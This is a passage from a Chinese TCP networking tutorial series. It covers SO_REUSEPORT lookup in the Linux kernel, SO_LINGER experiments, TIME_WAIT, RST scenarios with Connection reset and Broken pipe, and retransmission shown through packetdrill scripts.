UDP 和 TCP 引入了 SO_REUSEPORT group 的概念，在查找匹配的 socket 时，就不用遍历整条冲突链，对于设置了 SO_REUSEPORT 选项的 socket 经过二次哈希找到对应的 SO_REUSEPORT group，从中随机选择一个进行处理。以 4.6 内核代码为例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74  struct sock *__inet_lookup_listener(struct net *net, \tstruct inet_hashinfo *hashinfo, \tstruct sk_buff *skb, int doff, \tconst __be32 saddr, __be16 sport, \tconst __be32 daddr, const unsigned short hnum, \tconst int dif) { \tstruct sock *sk, *result; \tstruct hlist_nulls_node *node;  \t// 根据目标端口号计算 listening_hash 的哈希槽位，hash 是一个 [0, 31] 之间的值 \tunsigned int hash = inet_lhashfn(net, hnum); // 根据哈希槽位找到冲突链 struct inet_listen_hashbucket *ilb = \u0026amp;hashinfo-\u0026gt;listening_hash[hash]; int score, hiscore, matches = 0, reuseport = 0; bool select_ok = true; u32 phash = 0;  begin: \tresult = NULL; // 当前遍历过程中的最高得分 hiscore = 0; sk_nulls_for_each_rcu(sk, node, \u0026amp;ilb-\u0026gt;head) { // 根据匹配程度计算每个得分 score = compute_score(sk, net, hnum, daddr, dif); if (score \u0026gt; hiscore) { result = sk; hiscore = score; reuseport = sk-\u0026gt;sk_reuseport;  \t// 有更合适的 reuseport 组，则根据 daddr、hnum、saddr、sport 再次计算哈希值 \tif (reuseport) { \tphash = inet_ehashfn(net, daddr, hnum, saddr, sport); if (select_ok) { struct sock *sk2; // 根据这个哈希值从 SO_REUSEPORT group 中选择一个 socket sk2 = reuseport_select_sock(sk, phash, skb, doff); if (sk2) { result = sk2; goto found; } } matches = 1; } } else if (score == hiscore \u0026amp;\u0026amp; reuseport) { // 当前面的 SO_REUSEPORT group 查找不适用时，退化为 4.5 版本之前的算法。 matches++; if (reciprocal_scale(phash, matches) == 0) result = sk; phash = next_pseudo_random32(phash); } } /* * if the nulls value we got at the end of this lookup is * not the expected one, we must restart lookup. * We probably met an item that was moved to another chain. */ if (get_nulls_value(node) != hash + LISTENING_NULLS_BASE) goto begin; if (result) { found: \tif (unlikely(!atomic_inc_not_zero(\u0026amp;result-\u0026gt;sk_refcnt))) \tresult = NULL; else if (unlikely(compute_score(result, net, hnum, daddr, dif) \u0026lt; hiscore)) { sock_put(result); select_ok = false; goto begin; } } rcu_read_unlock(); return result; }   从 SO_REUSEPORT group 中查找的逻辑如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13  struct sock *reuseport_select_sock(struct sock *sk, \tu32 hash, \tstruct sk_buff *skb, \tint hdr_len) { \tstruct sock_reuseport *reuse = sk-\u0026gt;sk_reuseport_cb;  // 当前 group 中 socket 的数量 \tu16 socks = reuse-\u0026gt;num_socks; \t// reciprocal_scale 函数根据 hash 生成 [0, socks-1] 之间的随机数 \t// 根据哈希索引选择命中的 socket \tstruct sock *sk2 = reuse-\u0026gt;socks[reciprocal_scale(hash, socks)]; \treturn sk2; }   过程如下图所示。\nSO_REUSEPORT 与安全性 试想下面的场景，你的进程进程监听了某个端口，不怀好意的其他人也可以监听相同的端口来“窃取”流量信息，这种方式被称为端口劫持（port hijacking）。SO_REUSEPORT 在安全性方面的考虑主要是下面这两点。\n1、只有第一个启动的进程启用了 SO_REUSEPORT 选项，后面启动的进程才可以绑定同一个端口。 2、后启动的进程必须与第一个进程的有效用户ID（effective user ID）匹配才可以绑定成功。\nSO_REUSEPORT 的应用 SO_REUSEPORT 带来了两个明显的好处：\n 实现了内核级的负载均衡 支持滚动升级（Rolling updates）  内核级的负载均衡在前面的 Nginx 的例子中已经介绍过了，这里不再赘述。使用 SO_REUSEPORT 做滚动升级的过程如下图所示。\n步骤如下所示。\n 新启动一个新版本 v2 ，监听同一个端口，与 v1 旧版本一起处理请求。 发送信号给 v1 版本的进程，让它不再接受新的请求 等待一段时间，等 v1 版本的用户请求都已经处理完毕时，v1 版本的进程退出，留下 v2 版本继续服务  小结 这个小节主要介绍了 SO_REUSEPORT 参数相关的知识，本来是一个很简单的参数选项，为了讲清楚来龙去脉，还是挺复杂的。\n19、优雅关闭连接 —— Socket 选项之 SO_LINGER 这篇文章我们来讲一个新的参数 SO_LINGER，以一个小测验来开始今天的文章。 请看下面的代码：\n1 2 3 4 5 6 7 8  Socket socket = new Socket(); InetSocketAddress serverSocketAddress = new InetSocketAddress(\u0026#34;10.0.0.3\u0026#34;, 8080); socket.connect(serverSocketAddress);  byte[] msg = getMessageBytes(); socket.getOutputStream().write(msg);  socket.close();   会发现如下哪个选项的事情\n 服务器收到 msg 所有内容 服务器会收到 msg 部分内容 服务器会抛出异常  简化为图如下： 当我们调用 write 函数向内核写入一段数据时，内核会把这段数据放入一个缓冲区 buffer，如下图所示\n关闭连接的两种方式 前面有介绍过有两种方式可以关闭 TCP 连接\n FIN：优雅关闭，发送 FIN 包表示自己这端所有的数据都已经发送出去了，后面不会再发送数据 RST：强制连接重置关闭，无法做出什么保证  当调用 socket.close() 的时候会发生什么呢？\n正常情况下\n 操作系统等所有的数据发送完才会关闭连接 因为是主动关闭，所以连接将处于 TIME_WAIT 两个 MSL  前面说了正常情况，那一定有不正常的情况下，如果我们不想等那么久才彻底关闭这个连接怎么办，这就是我们这篇文章介绍的主角 SO_LINGER\nSO_LINGER Linux 的套接字选项SO_LINGER 用来改变socket 执行 close() 函数时的默认行为。\nlinger 的英文释义有逗留、徘徊、继续存留、缓慢消失的意思。这个释义与这个参数真正的含义很接近。\nSO_LINGER 启用时，操作系统开启一个定时器，在定时器期间内发送数据，定时时间到直接 RST 连接。\nSO_LINGER 参数是一个 linger 结构体，代码如下\n1 2 3 4  struct linger {  int l_onoff; /* linger active */  int l_linger; /* how many seconds to linger for */ };   第一个字段 l_onoff 用来表示是否启用 linger 特性，非 0 为启用，0 为禁用 ，linux 内核默认为禁用。这种情况下 close 函数立即返回，操作系统负责把缓冲队列中的数据全部发送至对端\n第二个参数 l_linger 在 l_onoff 为非 0 （即启用特性）时才会生效。\n 如果 l_linger 的值为 0，那么调用 close，close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接 如果 l_linger 的值为非 0，那么此时 close 函数在阻塞直到 l_linger 时间超时或者数据发送完毕，发送队列在超时时间段内继续尝试发送，如果发送完成则皆大欢喜，超时则直接丢弃缓冲区内容 并 RST 掉连接。  实验时间 我们用一个例子来说明上面的三种情况。\n服务端代码如下，监听 9999 端口，收到客户端发过来的数据不做任何处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import java.util.Date; public class Server {   public static void main(String[] args) throws Exception {  ServerSocket serverSocket = new ServerSocket();  serverSocket.setReuseAddress(true);  serverSocket.bind(new InetSocketAddress(9999));   while (true) {  Socket socket = serverSocket.accept();  InputStream input = socket.getInputStream();  ByteArrayOutputStream output = new ByteArrayOutputStream();  byte[] buffer = new byte[1];  int length;  while ((length = input.read(buffer)) != -1) {  output.write(buffer, 0, length);  }  String req = new String(output.toByteArray(), \u0026#34;utf-8\u0026#34;);  System.out.println(req.length());  socket.close();  }  } }   客户端代码如下，客户端往服务器发送 1000 个 \u0026ldquo;hel\u0026rdquo; 字符，代码最后输出了 close 函数调用的耗时\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import java.net.SocketAddress;  public class Client {  private static int PORT = 9999;  private static String HOST = \u0026#34;c1\u0026#34;;   public static void main(String[] args) throws Exception {  Socket socket = new Socket();  // 测试#1: 默认设置  socket.setSoLinger(false, 0);  // 测试#2  // socket.setSoLinger(true, 0);  // 测试#3  //socket.setSoLinger(true, 1);   SocketAddress address = new InetSocketAddress(HOST, PORT);  socket.connect(address);   OutputStream output = socket.getOutputStream();  StringBuilder sb = new StringBuilder();  for (int i = 0; i \u0026lt; 10000; i++) {  sb.append(\u0026#34;hel\u0026#34;);  }  byte[] request = sb.toString().getBytes(\u0026#34;utf-8\u0026#34;);  output.write(request);  long start = System.currentTimeMillis();  socket.close();  long end = System.currentTimeMillis();  System.out.println(\u0026#34;close time cost: \u0026#34; + (end - start));  } }    情况#1 socket.setSoLinger(false, 0)\n 这个是默认的行为，close 函数立即返回，且服务器应该会收到所有的 30kB 的数据。运行代码同时 wireshark 抓包，客户端输出 close 的耗时为\n1  close time cost: 0   wireshark 抓包情况如下，可以看到完成正常四次挥手\n整个发送的包大小为 30kB\n 情况#2 socket.setSoLinger(true, 0) 这种情况下，理论上 close 函数应该立刻返回，同时丢弃缓冲区的内容，可能服务端收到的数据只是部分的数据。\n 客户端终端的输出如下：\n1  close time cost: 0   服务端抛出了异常，输出如下：\n1 2 3 4 5  Exception in thread \u0026#34;main\u0026#34; java.net.SocketException: Connection reset \tat java.net.SocketInputStream.read(SocketInputStream.java:210) \tat java.net.SocketInputStream.read(SocketInputStream.java:141) \tat java.net.SocketInputStream.read(SocketInputStream.java:127) \tat Server.main(Server.java:21)   通过 wireshark 抓包如下： 可以看到，没有执行正常的四次挥手，客户端直接发送 RST 包，重置了连接。\n传输包的大小也没有30kB，只有14kB，说明丢弃了内核缓冲区的 16KB 的数据。 情况#3 socket.setSoLinger(true, 1);\n这种情况下，close 函数不会立刻返回，如果在 1s 内数据传输结束，则皆大欢喜，如果在 1s 内数据没有传输完，就直接丢弃掉，同时 RST 连接\n运行代码，客户端输出显示 close 函数耗时 17ms，不再是前面两个例子中的 0 ms 了。\n1  close time cost: 17   通过 wireshark 抓包可以看到完成了正常的四次挥手\n小结 这篇文章主要介绍了 SO_LINGER 套接字选项对关闭套接字的影响。默认行为下是调用 close 立即返回，但是如果有数据残留在套接字发送缓冲区中，系统将试着把这些数据发送给对端，SO_LINGER 可以改变这个默认设置，具体的规则见下面的思维导图。\n20、一个神奇的状态 —— TIME_WAIT TIME_WAIT 是 TCP 所有状态中最不好理解的一种状态。首先，我们需要明确，只有主动断开的那一方才会进入 TIME_WAIT 状态，且会在那个状态持续 2 个 MSL（Max Segment Lifetime）。\n为了讲清楚 TIME_WAIT，需要先介绍一下 MSL 的概念。\nMSL：Max Segment Lifetime MSL（报文最大生存时间）是 TCP 报文在网络中的最大生存时间。这个值与 IP 报文头的 TTL 字段有密切的关系。\nIP 报文头中有一个 8 位的存活时间字段（Time to live, TTL）如下图。 这个存活时间存储的不是具体的时间，而是一个 IP 报文最大可经过的路由数，每经过一个路由器，TTL 减 1，当 TTL 减到 0 时这个 IP 报文会被丢弃。\nTTL 经过路由器不断减小的过程如下图所示，假设初始的 TTL 为 12，经过下一个路由器 R1 以后 TTL 变为 11，后面每经过一个路由器以后 TTL 减 1\n从上面可以看到 TTL 说的是「跳数」限制而不是「时间」限制，尽管如此我们依然假设最大跳数的报文在网络中存活的时间不可能超过 MSL 秒。Linux 的套接字实现假设 MSL 为 30 秒，因此在 Linux 机器上 TIME_WAIT 状态将持续 60秒。\n构造一个 TIME_WAIT 要构造一个 TIME_WAIT 非常简单，只需要建立一个 TCP 连接，然后断开某一方连接，主动断开的那一方就会进入 TIME_WAIT 状态，我们用 Linux 上开箱即用的 nc 命令来构造一个。过程如下图：\n 在机器 c2 上用nc -l 8888启动一个 TCP 服务器 在机器 c1 上用 nc c2 8888 创建一条 TCP 连接 在机器 c1 上用 Ctrl+C 停止 nc 命令，随后在用netstat -atnp | grep 8888查看连接状态。  1 2  netstat -atnp | grep 8888 tcp 0 0 10.211.55.5:60494 10.211.55.10:8888 TIME_WAIT -   TIME_WAIT 存在的原因是什么 第一个原因是：数据报文可能在发送途中延迟但最终会到达，因此要等老的“迷路”的重复报文段在网络中过期失效，这样可以避免用相同源端口和目标端口创建新连接时收到旧连接姗姗来迟的数据包，造成数据错乱。\n比如下面的例子\n假设客户端 10.211.55.2 的 61594 端口与服务端 10.211.55.10 的 8080 端口一开始建立了一个 TCP 连接。\n假如客户端发送完 FIN 包以后不等待直接进入 CLOSED 状态，老连接 SEQ=3 的包因为网络的延迟。过了一段时间相同的 IP 和端口号又新建了另一条连接，这样 TCP 连接的四元组就完全一样了。恰好 SEQ 因为回绕等原因也正好相同，那么 SEQ=3 的包就无法知道到底是旧连接的包还是新连接的包了，造成新连接数据的混乱。\nTIME_WAIT 等待时间是 2 个 MSL，已经足够让一个方向上的包最多存活 MSL 秒就被丢弃，保证了在创建新的 TCP 连接以后，老连接姗姗来迟的包已经在网络中被丢弃消逝，不会干扰新的连接。\n第二个原因是确保可靠实现 TCP 全双工终止连接。关闭连接的四次挥手中，最终的 ACK 由主动关闭方发出，如果这个 ACK 丢失，对端（被动关闭方）将重发 FIN，如果主动关闭方不维持 TIME_WAIT 直接进入 CLOSED 状态，则无法重传 ACK，被动关闭方因此不能及时可靠释放。\n如果四次挥手的第 4 步中客户端发送了给服务端的确认 ACK 报文以后不进入 TIME_WAIT 状态，直接进入 CLOSED状态，然后重用端口建立新连接会发生什么呢？如下图所示\n主动关闭方如果马上进入 CLOSED 状态，被动关闭方这个时候还处于LAST-ACK状态，主动关闭方认为连接已经释放，端口可以重用了，如果使用相同的端口三次握手发送 SYN 包，会被处于 LAST-ACK状态状态的被动关闭方返回一个 RST，三次握手失败。\n为什么时间是两个 MSL  1 个 MSL 确保四次挥手中主动关闭方最后的 ACK 报文最终能达到对端 1 个 MSL 确保对端没有收到 ACK 重传的 FIN 报文可以到达  2MS = 去向 ACK 消息最大存活时间（MSL) + 来向 FIN 消息的最大存活时间（MSL）\nTIME_WAIT 的问题 在一个非常繁忙的服务器上，如果有大量 TIME_WAIT 状态的连接会怎么样呢？\n 连接表无法复用 socket 结构体内存占用  连接表无法复用 因为处于 TIME_WAIT 的连接会存活 2MSL（60s），意味着相同的TCP 连接四元组（源端口、源 ip、目标端口、目标 ip）在一分钟之内都没有办法复用，通俗一点来讲就是“占着茅坑不拉屎”。\n假设主动断开的一方是客户端，对于 web 服务器而言，目标地址、目标端口都是固定值（比如本机 ip + 80 端口），客户端的 IP 也是固定的，那么能变化的就只有端口了，在一台 Linux 机器上，端口最多是 65535 个（ 2 个字节）。如果客户端与服务器通信全部使用短连接，不停的创建连接，接着关闭连接，客户端机器会造成大量的 TCP 连接进入 TIME_WAIT 状态。\n可以来写一个简单的 shell 脚本来测试一下，使用 nc 命令连接 redis 发送 ping 命令以后断开连接。\n1 2 3  for i in {1..10000}; do  echo ping | nc localhost 6379 done   查看一下处于 TIME_WAIT 状态的连接的个数，短短的几秒钟内，TIME_WAIT 状态的连接已经有了 8000 多个。\n1 2  netstat -tnpa | grep -i 6379 | grep TIME_WAIT| wc -l 8192   如果在 60s 内有超过 65535 次 redis 短连接操作，就会出现端口不够用的情况，这也是使用连接池的一个重要原因。\n应对 TIME_WAIT 的各种操作 针对 TIME_WAIT 持续时间过长的问题，Linux 新增了几个相关的选项，net.ipv4.tcp_tw_reuse 和 net.ipv4.tcp_tw_recycle。下面我们来说明一下这两个参数的用意。 这两个参数都依赖于 TCP 头部的扩展选项：timestamp\nTCP 头部时间戳选项（TCP Timestamps Option，TSopt） 除了我们之前介绍的 MSS、Window Scale 还有以一个非常重要的选项：时间戳（TCP Timestamps Option，TSopt）\n它由四部分构成：类别（kind）、长度（Length）、发送方时间戳（TS value）、回显时间戳（TS Echo Reply）。时间戳选项类别（kind）的值等于 8，用来与其它类型的选项区分。长度（length）等于 10。两个时间戳相关的选项都是 4 字节。\n如下图所示：\n是否使用时间戳选项是在三次握手里面的 SYN 报文里面确定的。下面的包是curl github.com抓包得到的结果。\n 发送方发送数据时，将一个发送时间戳 1734581141 放在发送方时间戳TSval中 接收方收到数据包以后，将收到的时间戳 1734581141 原封不动的返回给发送方，放在TSecr字段中，同时把自己的时间戳 3303928779 放在TSval中 后面的包以此类推  有几个需要说明的点\n  时间戳是一个单调递增的值，与我们所知的 epoch 时间戳不是一回事。这个选项不要求两台主机进行时钟同步\n  timestamps 是一个双向的选项，如果只要有一方不开启，双方都将停用 timestamps。比如下面是curl www.baidu.com得到的包\n可以看到客户端发起 SYN 包时带上了自己的TSval，服务器回复的SYN+ACK 包没有TSval和TSecr，从此之后的包都没有带上时间戳选项了。\n  有了这个选项，我们来看一下 tcp_tw_reuse 选项\ntcp_tw_reuse 选项 缓解紧张的端口资源，一个可行的方法是重用“浪费”的处于 TIME_WAIT 状态的连接，当开启 net.ipv4.tcp_tw_reuse 选项时，处于 TIME_WAIT 状态的连接可以被重用。下面把主动关闭方记为 A， 被动关闭方记为 B，它的原理是：\n 如果主动关闭方 A 收到的包时间戳比当前存储的时间戳小，说明是一个迷路的旧连接的包，直接丢弃掉 如果因为 ACK 包丢失导致被动关闭方还处于LAST-ACK状态，并且会持续重传 FIN+ACK。这时 A 发送SYN 包想三次握手建立连接，此时 A 处于SYN-SENT阶段。当收到 B 的 FIN 包时会回以一个 RST 包给 B，B 这端的连接会进入 CLOSED 状态，A 因为没有收到 SYN 包的 ACK，会重传 SYN，后面就一切顺利了。  tcp_tw_recyle 选项 tcp_tw_recyle 是一个比 tcp_tw_reuse 更激进的方案， 系统会缓存每台主机（即 IP）连接过来的最新的时间戳。对于新来的连接，如果发现 SYN 包中带的时间戳与之前记录的来自同一主机的同一连接的分组所携带的时间戳相比更旧，则直接丢弃。如果更新则接受复用 TIME-WAIT 连接。\n这种机制在客户端与服务端一对一的情况下没有问题，如果经过了 NAT 或者负载均衡，问题就很严重了。\n什么是 NAT呢？\nNAT（Network Address Translator）的出现是为了缓解 IP 地址耗尽的临时方案，IPv4 的地址是 32 位，全部利用最 多只能提 42.9 亿个地址，去掉保留地址、组播地址等剩下的只有 30 多亿，互联网主机数量呈指数级的增长，如果给每个设备都分配一个唯一的 IP 地址，那根本不够。于是 1994 年推出的 NAT 规范，NAT 设备负责维护局域网私有 IP 地址和端口到外网 IP 和端口的映射规则。\n它有两个明显的优点\n 出口 IP 共享：通过一个公网地址可以让许多机器连上网络，解决 IP 地址不够用的问题 安全隐私防护：实际的机器可以隐藏自己真实的 IP 地址 当然也有明显的弊端：NAT 会对包进行修改，有些协议无法通过 NAT。  当 tcp_tw_recycle 遇上 NAT 时，因为客户端出口 IP 都一样，会导致服务端看起来都在跟同一个 host 打交道。不同客户端携带的 timestamp 只跟自己相关，如果一个时间戳较大的客户端 A 通过 NAT 与服务器建连，时间戳较小的客户端 B 通过 NAT 发送的包服务器认为是过期重复的数据，直接丢弃，导致 B 无法正常建连和发数据。\n小结 TIME_WAIT 状态是最容易造成混淆的一个概念，这个状态存在的意义是\n 可靠的实现 TCP 全双工的连接终止（处理最后 ACK 丢失的情况） 避免当前关闭连接与后续连接混淆（让旧连接的包在网络中消逝）  习题 1、TCP 状态变迁中，存在 TIME_WAIT 状态，请问以下正确的描述是？\n A、TIME_WAIT 状态可以帮助 TCP 的全双工连接可靠释放 B、TIME_WAIT 状态是 TCP 是三次握手过程中的状态 C、TIME_WAIT 状态是为了保证重新生成的 socket 不受之前延迟报文的影响 D、TIME_WAIT 状态是为了让旧数据包消失在网络中  思考题 假设 MSL 是 60s，请问系统能够初始化一个新连接然后主动关闭的最大速率是多少？（忽略1~1024区间的端口）\n欢迎你在留言区留言，和我一起讨论。\n21、爱搞事情的 RST 包 —— 产生场景、Connection reset 与 Broken pipe 这篇文章我们来讲解 RST，RST 是 TCP 字发生错误时发送的一种分节，下面我们来介绍 RST 包出现常见的几种情况，方便你以后遇到 RST 包以后有一些思路。\n在 TCP 协议中 RST 表示复位，用来异常的关闭连接，发送 RST 关闭连接时，不必等缓冲区的数据都发送出去，直接丢弃缓冲区中的数据，连接释放进入CLOSED状态。而接收端收到 RST 段后，也不需要发送 ACK 确认。\nRST 常见的几种情况 我列举了常见的几种会出现 RST 的情况\n端口未监听 这种情况很常见，比如 web 服务进程挂掉或者未启动，客户端使用 connect 建连，都会出现 \u0026ldquo;Connection Reset\u0026rdquo; 或者\u0026quot;Connection refused\u0026quot; 错误。\n这样机制可以用来检测对端端口是否打开，发送 SYN 包对指定端口，看会不会回复 SYN+ACK 包。如果回复了 SYN+ACK，说明监听端口存在，如果返回 RST，说明端口未对外监听，如下图所示\n一方突然断电重启，之前建立的连接信息丢失，另一方并不知道 这个场景在前面 keepalive 那里介绍过。客户端和服务器一开始三次握手建立连接，中间没有数据传输进入空闲状态。这时候服务器突然断电重启，之前主机上所有的 TCP 连接都丢失了，但是客户端完全不知晓这个情况。等客户端有数据有数据要发送给服务端时，服务端这边并没有这条连接的信息，发送 RST 给客户端，告知客户端自己无法处理，你趁早死了这条心吧。\n整个过程如下图所示：\n调用 close 函数，设置了 SO_LINGER 为 true 如果设置 SO_LINGER 为 true，linger 设置为 0，当调用 socket.close() 时， close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接。在 SO_LINGER 那一节有详细介绍这个参数的含义。\nRST 包如果丢失了怎么办？ 这是一个比较有意思的问题，首先需要明确 RST 是不需要确认的。 下面假定是服务端发出 RST。\n在 RST 没有丢失的情况下，发出 RST 以后服务端马上释放连接，进入 CLOSED 状态，客户端收到 RST 以后，也立刻释放连接，进入 CLOSED 状态。\n如下图所示\n如果 RST 丢失呢？\n服务端依然是在发送 RST 以后马上进入CLOSED状态，因为 RST 丢失，客户端压根搞不清楚状况，不会有任何动作。等到有数据需要发送时，一厢情愿的发送数据包给服务端。因为这个时候服务端并没有这条连接的信息，会直接回复 RST。\n如果客户端收到了这个 RST，就会自然进入CLOSED状态释放连接。如果 RST 依然丢失，客户端只是会单纯的数据丢包了，进入数据重传阶段。如果还一直收不到 RST，会在一定次数以后放弃。\n如下图所示\nBroken pipe 与 Connection reset by peer Broken pipe 与 Connection reset by peer 错误在网络编程中非常常见，出现的前提都是连接已关闭。\nConnection reset by peer 这个错误很好理解，前面介绍了很多 RST 出现的场景。\nBroken pipe出现的时机是：在一个 RST 的套接字继续写数据，就会出现Broken pipe。\n下面来模拟 Broken pipe 的情况，服务端代码非常简单，几乎什么都没做，完整的代码见：Server.java\n1 2 3 4 5 6 7 8 9 10 11 12  public class Server {  public static void main(String[] args) throws Exception {  ServerSocket serverSocket = new ServerSocket(9999);  Socket socket = serverSocket.accept();  OutputStream out = socket.getOutputStream();  while (true) {  BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));  String line = reader.readLine();  System.out.println(\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt; process \u0026#34; + line);  out.write(\u0026#34;hello, this is server\u0026#34;.getBytes());  }  }   使用javac Server.java; javac -cp . Server编译并运行服务端代码。\n客户端代码如下，完整的代码见：Client.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  public class Client {  public static void main(String[] args) throws Exception {  Socket socket = new Socket();  socket.connect(new InetSocketAddress(\u0026#34;c2\u0026#34;, 9999));   OutputStream out = socket.getOutputStream();   System.out.println(\u0026#34;start sleep. kill server process now!\u0026#34;);   // 这个时候 kill 掉服务端进程  TimeUnit.SECONDS.sleep(5);   System.out.println(\u0026#34;start first write\u0026#34;);  // 第一次 write，客户端并不知道连接已经不在了，这次 write 不会抛异常,只会触发 RST 包，应用层是收不到的  out.write(\u0026#34;hello\u0026#34;.getBytes());   TimeUnit.SECONDS.sleep(2);  System.out.println(\u0026#34;start second write\u0026#34;);  // 第二次 write, 触发 Broken Pipe  out.write(\u0026#34;world\u0026#34;.getBytes());   System.in.read();  } }   思路是先三次握手建连，然后马上 kill 掉服务端进程。客户端随后进行了两次 write，第一次 write 会触发服务端发送 RST 包，第二次 write 会抛出Broken pipe异常\n1 2 3 4 5 6 7 8  start sleep. kill server process now! start first write start second write Exception in thread \u0026#34;main\u0026#34; java.net.SocketException: Broken pipe \tat java.net.SocketOutputStream.socketWrite0(Native Method) \tat java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) \tat java.net.SocketOutputStream.write(SocketOutputStream.java:141) \tat Client.main(Client.java:25)   抓包见下图，完整的 pcap 文件见：broken_pipe.pcap\n那 Broken pipe 到底是什么呢？这就要从 SIGPIPE 信号说起。\n当一个进程向某个已收到 RST 的套接字执行写操作时，内核向该进程发送一个 SIGPIPE 信号。该信号的默认行为是终止进程，因此进程一般会捕获这个信号进行处理。不论该进程是捕获了该信号并从其信号处理函数返回，还是简单地忽略该信号，写操作都将返回 EPIPE 错误（也就Broken pipe 错误）,这也是 Broken pipe 只在写操作中出现的原因。\n相比于 Broken pipe，Connection reset by peer 这个错误就更加容易出现一些了。一个最简单的方式是把上面代码中的第二次 write 改为 read，就会出现 Connection reset，完整的代码见：Client2.java\n运行日志如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  start sleep. kill server process now! start first write start second write Exception in thread \u0026#34;main\u0026#34; java.net.SocketException: Connection reset \tat java.net.SocketInputStream.read(SocketInputStream.java:209) \tat java.net.SocketInputStream.read(SocketInputStream.java:141) \tat sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284) \tat sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326) \tat sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178) \tat java.io.InputStreamReader.read(InputStreamReader.java:184) \tat java.io.BufferedReader.fill(BufferedReader.java:161) \tat java.io.BufferedReader.readLine(BufferedReader.java:324) \tat java.io.BufferedReader.readLine(BufferedReader.java:389) \tat Client.main(Client.java:28)   小结 这篇文章主要介绍了 RST 包相关的内容，我们来回顾一下。首先介绍了 RST 出现常见的几种情况\n 端口未监听 连接信息丢失，另一方并不知道继续发送数据 SO_LINGER 设置丢弃缓冲区数据，立刻 RST  然后介绍了两个场景的错误 Connection reset 和 Broken pipe 以及背后的原因，RST 包的案例后面还有一篇文章会介绍。\n22、重传机制 —— 超时重传、快速重传与 SACK 重传示例 下面用 packetdrill 来演示丢包重传，模拟的场景如下图\npacketdrill 脚本如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18   1 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  2 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0  3 +0 bind(3, ..., ...) = 0  4 +0 listen(3, 1) = 0  5  6 // 三次握手  7 +0 \u0026lt; S 0:0(0) win 4000 \u0026lt;mss 1000\u0026gt;  8 +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt;  9 +.1 \u0026lt; . 1:1(0) ack 1 win 4000  10 +0 accept(3, ..., ...) = 4  11  12 // 往 fd 为 4 的 socket 文件句柄写入 1000 个字节数据（也即向客户端发送数据）  13 +0 write(4, ..., 1000) = 1000  14  15 // 注释掉 向协议栈注入 ACK 包的代码，模拟客户端不回 ACK 包的情况  16 // +.1 \u0026lt; . 1:1(0) ack 1001 win 1000  17  18 +0 `sleep 1000000`    1 ~ 4 行：新建 socket + bind + listen 7 ~ 9 行：三次握手 + accept 新的连接 13 行：服务端往新的 socket 连接上写入 1000 个字节的文件 16 行：正常情况下，客户端应该回复 ACK 包表示此前的 1000 个字节包已经收到，这里注释掉模拟 ACK 包丢失的情况。  使用 tcpdump 抓包保存为 pcap 格式，后面 wireshark 可以直接查看\n1  sudo tcpdump -i any port 8080 -nn -A -w retrans.pcap   使用 wireshark 打开这个 pcap 文件，因为我们想看重传的时间间隔，可以在 wireshark 中设置时间的显示格式为显示包与包直接的实际间隔，更方便的查看重传间隔，步骤如下图\n可以看到重传时间间隔是指数级退避，直到达到 120s 为止，总时间将近 15 分钟，重传次数是 15次 ，重传次数默认值由 /proc/sys/net/ipv4/tcp_retries2 决定（等于 15），会根据 RTO 的不同来动态变化。\n整个过程如下：\n永远记住 ACK 是表示这之前的包都已经全部收到 如果发送 5000 个字节的数据包，因为 MSS 的限制每次传输 1000 个字节，分 5 段传输，如下图：\n数据包 1 发送的数据正常到达接收端，接收端回复 ACK 1001，表示 seq 为1001之前的数据包都已经收到，下次从1001开始发。 数据包 2（10001：2001）因为某些原因未能到达服务端，其他包正常到达，这时接收端也不能 ack 3 4 5 数据包，因为数据包 2 还没收到，接收端只能回复 ack 1001。\n第 2 个数据包重传成功以后服务器会回复5001，表示seq 为 5001 之前的数据包都已经收到了。\n快速重传机制与 SACK 文章一开始我们介绍了重传的时间间隔，要等几百毫秒才会进行第一次重传。聪明的网络协议设计者们想到了一种方法：「快速重传」 快速重传的含义是：当发送端收到 3 个或以上重复 ACK，就意识到之前发的包可能丢了，于是马上进行重传，不用傻傻的等到超时再重传。\n这个有一个问题，发送 3、4、5 包收到的全部是 ACK=1001，快速重传解决了一个问题: 需要重传。因为除了 2 号包，3、4、5 包也有可能丢失，那到底是只重传数据包 2 还是重传 2、3、4、5 所有包呢？\n聪明的网络协议设计者，想到了一个好办法\n 收到 3 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:3001] 区间的包我也收到了 收到 4 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:4001] 区间的包我也收到了 收到 5 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:5001] 区间的包我也收到了  这样发送端就清楚知道只用重传 2 号数据包就可以了，数据包 3、4、5已经确认无误被对端收到。这种方式被称为 SACK（Selective Acknowledgment）。\n如下图所示：\n使用 packetdrill 演示快速重传 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24   1 --tolerance_usecs=100000  // 常规操作：初始化  2 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  3 +0 setsockopt(3, 